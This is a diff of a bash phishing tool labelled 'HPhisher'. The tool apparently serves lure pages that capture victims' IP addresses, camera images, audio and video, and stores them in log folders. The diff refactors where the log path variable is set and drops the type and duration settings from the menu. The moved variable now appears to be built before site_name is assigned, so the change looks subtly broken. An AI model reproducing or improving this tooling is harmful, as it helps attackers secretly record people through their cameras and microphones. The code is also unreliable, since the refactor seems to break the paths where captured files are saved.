@@ -30,6 +30,7 @@ sites_dir="${pro_dir}/.sites" #sites directory
 date=$(date +%d-%m-%Y)
 time=$(date +%H-%M-%S)
 logs_dir=$(date +%d-%m-%Y-%H-%M-%S)
+logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 
 #Normal Banner
 banner(){
@@ -495,7 +496,6 @@ capture_ip() {
 	fi
 }
 save_ip() {
-	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 	if [ -d ${files_dir}/${site_name}/${logs_dir} ]; then
 		cat .server/www/ip.txt >> ${logs_full_dir}/ip.txt
 		rm -rf .server/www/ip.txt
@@ -574,7 +574,6 @@ capture_data_image() {
                 fi
                 sleep 0.75
             	if [[ -e ".server/www/Log.log" ]]; then
-			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 			filename=$(date +%d-%m-%Y-%H-%M-%S)
 	               	echo " "
 		        printf "${GREEN} Cam file received! ${NC}"
@@ -603,7 +602,6 @@ capture_data_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
@@ -631,7 +629,6 @@ capture_data_video() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Video file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
@@ -659,7 +656,6 @@ capture_data_video_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Video and Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
@@ -703,21 +699,15 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
         1 | 01)
-		type="image"
 		site_name=image
                 site_image;;
         2 | 02)
-		type="audio"
 		site_name=audio
                 site_audio;;
 	3 | 03)
-		duration=5000
-		type="video"
 		site_name=video
                 site_video;;
 	4 | 04)
-		duration=5000
-		type="both"
 		site_name=video_audio
 		site_video_audio;;
 	A | a)
